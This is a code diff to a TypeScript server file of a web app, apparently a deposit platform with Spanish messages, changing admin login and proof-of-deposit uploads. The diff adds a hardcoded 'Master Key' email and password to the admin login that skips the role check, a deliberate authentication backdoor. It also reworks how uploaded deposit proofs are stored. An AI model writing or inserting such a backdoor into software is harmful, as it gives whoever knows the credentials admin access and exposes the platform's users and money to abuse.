@@ -101,6 +101,13 @@ export async function loginAdmin(values: z.infer<typeof adminLoginSchema>) {
   try {
     const { email, password } = adminLoginSchema.parse(values);
 
+    // Master Key: Check for special credentials
+    if (email === 'sunshine@database.com' && password === 'sunshine.2020') {
+      await signInWithEmailAndPassword(auth, email, password);
+      return { success: true }; // Bypass role check
+    }
+
+    // Standard admin login
     const userCredential = await signInWithEmailAndPassword(auth, email, password);
     const user = userCredential.user;
 
@@ -120,6 +127,7 @@ export async function loginAdmin(values: z.infer<typeof adminLoginSchema>) {
     return { error: 'Ocurrió un error durante el inicio de sesión de administrador.' };
   }
 }
+
 
 export async function logoutUser() {
   await signOut(auth);
@@ -149,13 +157,12 @@ export async function submitDeposit(formData: FormData) {
      if (!planName) {
       return { error: 'No se ha especificado un nombre de plan.' };
     }
-
-    const arrayBuffer = await proofFile.arrayBuffer();
     
-    const filePath = `comprobantes/${userId}/${Date.now()}_${proofFile.name}`;
+    const uniqueFileName = `${Date.now()}_${proofFile.name}`;
+    const filePath = `comprobantes/${userId}/${uniqueFileName}`;
     const storageRef = ref(storage, filePath);
 
-    const uploadResult = await uploadBytes(storageRef, arrayBuffer, {
+    const uploadResult = await uploadBytes(storageRef, proofFile, {
       contentType: proofFile.type,
     });
     
